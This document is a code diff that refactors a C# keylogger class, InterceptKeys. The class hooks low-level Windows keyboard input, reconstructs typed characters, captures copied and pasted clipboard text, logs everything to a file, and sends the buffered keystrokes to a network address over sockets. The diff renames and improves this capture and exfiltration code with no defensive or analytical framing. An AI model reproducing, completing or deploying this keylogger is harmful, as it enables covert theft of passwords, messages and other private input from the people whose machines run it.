@@ -6,7 +6,6 @@ using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
-using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
@@ -15,12 +14,12 @@ class InterceptKeys
 {
 	#region const
 	private const int WH_KEYBOARD_LL = 13;
-	
+
 	private const int WM_KEYDOWN = 0x0100;
 	private const int WM_KEYUP = 0x0101;
 	private const int WM_SYSKEYDOWN = 0x0104;
 	private const int WM_SYSKEYUP = 0x0105;
-	
+
 	private const int VK_LSHIFT = 0xA0;
 	private const int VK_RSHIFT = 0xA1;
 	private const int VK_CTRLMENU = 0xA2;
@@ -47,7 +46,8 @@ class InterceptKeys
 	private static bool ctrlMenu;
 	private static bool sendingData = false;
 	private static LowLevelKeyboardProc _proc = HookCallback;
-	private static SendData _sendData = SendVkCode;
+	private static byte[] keyboardState = new byte[256];
+	private static SendData _sendData = SendDataViaNetwork;
 	private static IntPtr _hookID = IntPtr.Zero;
 	private static readonly string myPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
 				"myfile.txt");
@@ -107,56 +107,40 @@ class InterceptKeys
 		var text = Marshal.PtrToStringAnsi(lParam);
 		int vkAction = (int)wParam;
 
-		var actionKey = "";
 		switch (vkAction)
 		{
 			case WM_KEYDOWN:
-				actionKey = nameof(WM_KEYDOWN);
-				SetSpecialDownVK(vkData,text);
-				break;
-			case WM_KEYUP:
-				actionKey = nameof(WM_KEYUP);
-				SetSpecialUpVKI(vkData);
-				break;
 			case WM_SYSKEYDOWN:
-				actionKey = nameof(WM_SYSKEYDOWN);
 				SetSpecialDownVK(vkData, text);
 				break;
+			case WM_KEYUP:
 			case WM_SYSKEYUP:
-				actionKey = nameof(WM_SYSKEYUP);
 				SetSpecialUpVKI(vkData);
 				break;
 		}
-#if DEBUG
-		//TraceLog(myfileStream, $"Action: {actionKey} - " +
-		//	$"vkAction: {vkAction} - " +
-		//	$"lParam: {lParam} - " +
-		//	$"ReadToInt: {vkData} - " +
-		//	$"PtrToString: {text}",
-		//	true);
-#endif
+
 		if (newValue.Count > maxDataLenght)
-		{			
-			if(!sendingData)
+		{
+			if (!sendingData)
 			{
-					sendingData = true;
+				sendingData = true;
 				Task.Run(() => SaveTheData());
-			}			
+			}
 		}
 	}
 
 	private static void SetKeyboardConfiguration()
 	{
-		if(Control.IsKeyLocked(Keys.CapsLock))
+		if (Control.IsKeyLocked(Keys.CapsLock))
 		{
-			InterceptKeys.caps = true;
+			caps = true;
 		}
-		if(Control.IsKeyLocked(Keys.NumLock))
+		if (Control.IsKeyLocked(Keys.NumLock))
 		{
-			InterceptKeys.numLock = true;
+			numLock = true;
 		}
 	}
-	
+
 	private static bool CheckNetwork(string ipAddress)
 	{
 		var pingSender = new Ping();
@@ -172,8 +156,8 @@ class InterceptKeys
 			pingOptions);
 		return pingReplay.Status == IPStatus.Success;
 	}
-	
-	private static void SendVkCode(byte[] data, string address, bool forceResend = false)
+
+	private static void SendDataViaNetwork(byte[] data, string address, bool forceResend = false)
 	{
 		try
 		{
@@ -182,11 +166,11 @@ class InterceptKeys
 				socket.SendTo(data, new IPEndPoint(IPAddress.Parse(address), port));
 			}
 		}
-		catch (Exception e)
+		catch
 		{
 			if (forceResend)
 			{
-				SendVkCode(data, address, forceResend);
+				SendDataViaNetwork(data, address, forceResend);
 			}
 		}
 	}
@@ -223,27 +207,31 @@ class InterceptKeys
 		return data;
 	}
 
+	#region manage key pressed
 	private static void SetSpecialDownVK(int intPressed, string textPressed)
 	{
-		switch(intPressed)
+		switch (intPressed)
 		{
 			case VK_ALT:
-				InterceptKeys.alt = true;
+				alt = true;
 				break;
-			case VK_CAPS:
+			case VK_CAPS:				
 				caps = !caps;
+				keyboardState[(int)Keys.CapsLock] = (byte)(caps ? 0xff : 0x00);
 				break;
-			case VK_NUMLOCK:
+			case VK_NUMLOCK:				
 				numLock = !numLock;
+				keyboardState[(int)Keys.NumLock] = (byte)(numLock ? 0xff : 0x00);
 				break;
 			case VK_CTRL:
 				ctrl = true;
 				break;
 			case VK_LSHIFT:
 			case VK_RSHIFT:
+				keyboardState[(int)Keys.ShiftKey] = 0xff;
 				shift = true;
 				break;
-			case VK_TAB: 
+			case VK_TAB:
 				tab = true;
 				break;
 			case VK_SPACE:
@@ -251,17 +239,21 @@ class InterceptKeys
 				newValue.Add(Char.Parse(textPressed));
 				break;
 			case VK_CTRLMENU:
+				ctrl = true;
 				ctrlMenu = true;
 				break;
 			case VK_ALTGR:
-				if(ctrlMenu)
+				if (ctrlMenu)
 				{
+					keyboardState[(int)Keys.ControlKey] = 0xff;
+					keyboardState[(int)Keys.Menu] = 0xff;
 					altGr = true;
 				}
 				break;
 			default:
 				//check if key pressed must to be added in list to char
-				 SetVkPressed(intPressed, textPressed);
+				//SetVkPressed(intPressed, textPressed);
+				SaveKeyPressedOrCopied(intPressed, textPressed);
 				break;
 		}
 	}
@@ -278,112 +270,50 @@ class InterceptKeys
 				break;
 			case VK_LSHIFT:
 			case VK_RSHIFT:
+				keyboardState[(int)Keys.ShiftKey] = 0x00;
 				shift = false;
 				break;
 			case VK_TAB:
 				tab = false;
 				break;
 			case VK_CTRLMENU:
+				ctrl = false;
 				ctrlMenu = false;
 				break;
 			case VK_ALTGR:
-				if(!ctrlMenu)
+				if (!ctrlMenu)
 				{
+					keyboardState[(int)Keys.ControlKey] = 0x00;
+					keyboardState[(int)Keys.Menu] = 0x00;
 					altGr = false;
 				}
 				break;
 		}
 	}
 
-	private static void SetVkPressed(int intPressed, string textPressed)
+	private static void SaveKeyPressedOrCopied(int intPressed, string textPressed)
 	{
-		var buf = new StringBuilder(256);
-		var keyboardState = new byte[256];
-		//numeric value
-		if (intPressed >= 48 && intPressed <= 57)
+		if (!alt && ctrl)
 		{
-			if(!shift)
+			//copy, paste and cut action
+			if (intPressed == 0x43 || intPressed == 0x58)
 			{
-				newValue.Add(Char.Parse(textPressed.ToLower()));
-				TraceLog(myfileStream, $"Pressed numeric key: {textPressed}", true);
+				tempClipboard = Clipboard.GetText();
+				TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
 			}
-			else
-			{				
-				keyboardState[(int)Keys.ShiftKey] = 0xff;
-				ToUnicode((uint)intPressed, 0, keyboardState, buf, 256, 0);
-				newValue.AddRange(buf.ToString().ToCharArray());
-				TraceLog(myfileStream, $"Pressed Numric Key and shif: {buf}", true);
+			if (intPressed == 0x56)
+			{
+				newValue.AddRange(tempClipboard.ToArray());
+				TraceLog(myfileStream, $"Pasted text: {tempClipboard}", true);
 			}
+		}
 
-		}				
-		//alphabet value
-		else if (intPressed > 57 && intPressed <= 90)
-		{
-			//manage all possible combination from copy, paste and cut, multi select
-			//to any type of comibination possibile to bypass eventyally key pressed 
-			// for same shortcut combination.
-			char charToAdd;
-			if (!ctrl && !alt)
-			{
-				if ((shift || caps))
-				{
-					charToAdd = Char.Parse(textPressed.ToUpper());
-				}
-				else
-				{
-					charToAdd = Char.Parse(textPressed.ToLower());
-				}
-				newValue.Add(charToAdd);
-				TraceLog(myfileStream, $"Pressed Char Key: {charToAdd}", true);
-			}
-			else if (!alt && ctrl)
-			{
-				//copy, paste and cut action
-				if (intPressed == 0x43 || intPressed == 0x58)
-				{
-					tempClipboard = Clipboard.GetText();
-					TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
-				}
-				if (intPressed == 0x56)
-				{
-					newValue.AddRange(tempClipboard.ToArray());
-					TraceLog(myfileStream, $"Pasted text: {tempClipboard}", true);
-				}
-			}
-			
-		}
-		//Numeric KeyPad 
-		else if (intPressed >= 0x60 && intPressed <= 0x69)
-		{
-			if(InterceptKeys.numLock)
-			{
-				var charToAdd = Char.Parse(textPressed);
-				newValue.Add(charToAdd);
-			}
-			TraceLog(myfileStream, $"Pressed Numeric Keypad: {textPressed}", true);
-		}
-		//special keys depend on keyboard layout
-		else if (intPressed >= 0xBA && intPressed <= 0xE2)
-		{
-			if(shift)
-			{
-				keyboardState[(int)Keys.ShiftKey] = 0xff;
-			}
-			if(altGr)
-			{
-				keyboardState[(int)Keys.ControlKey] = 0xff;
-				keyboardState[(int)Keys.Menu] = 0xff;
-			}
-			ToUnicode((uint)intPressed, 0, keyboardState, buf, 256, 0);
-			newValue.AddRange(buf.ToString().ToCharArray());
-			TraceLog(myfileStream, $"------ special char pressed: {buf}", true);
-		}	
-		//other key combination depend from keyboard layout set
-		else
-		{
-			TraceLog(myfileStream, $"Pressed other keys: {textPressed}", true);
-		}
+		var buf = new StringBuilder(256);
+		ToUnicode((uint)intPressed, 0, keyboardState, buf, 256, 0);
+		newValue.AddRange(buf.ToString().ToCharArray());
+		TraceLog(myfileStream, $"ToUnicode key pressed: --- {buf}", true);
 	}
+	#endregion
 
 	private static void TraceLog(StreamWriter streamWriter, string message, bool debug = false)
 	{
